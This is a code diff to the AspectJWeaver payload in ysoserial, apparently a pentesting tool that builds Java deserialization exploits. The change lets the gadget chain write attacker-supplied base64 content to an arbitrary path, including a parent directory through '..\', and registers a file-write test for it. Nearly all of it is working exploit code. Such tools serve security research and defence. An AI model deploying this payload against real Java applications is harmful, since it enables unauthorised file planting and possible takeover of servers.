@@ -11,6 +11,7 @@ import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
+import java.io.File;
 import java.io.Serializable;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
@@ -38,7 +39,7 @@ java -jar ysoserial.jar AspectJWeaver "ahi.txt;YWhpaGloaQ=="
 More information:
 https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
  */
-@PayloadTest(skip="non RCE")
+@PayloadTest(harness="ysoserial.test.payloads.SimpleFileWriteTest")
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
 @Authors({ Authors.JANG })
@@ -52,13 +53,14 @@ public class AspectJWeaver implements ObjectPayload<Serializable> {
         }
         String[] parts = command.split(";");
         String filename = parts[0];
+        File file = new File(filename);
         byte[] content = Base64.decodeBase64(parts[1]);
 
         Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
-        Object simpleCache = ctor.newInstance(".", 12);
+        Object simpleCache = ctor.newInstance(file.getParent().toString(), 12);
         Transformer ct = new ConstantTransformer(content);
         Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, file.getName());
         HashSet map = new HashSet(1);
         map.add("foo");
         Field f = null;
@@ -101,7 +103,7 @@ public class AspectJWeaver implements ObjectPayload<Serializable> {
     }
 
     public static void main(String[] args) throws Exception {
-        args = new String[]{"ahi.txt;YWhpaGloaQ=="};
+        args = new String[]{"..\\ahi.txt;YWhpaGloaQ=="};
         PayloadRunner.run(AspectJWeaver.class, args);
     }
 }
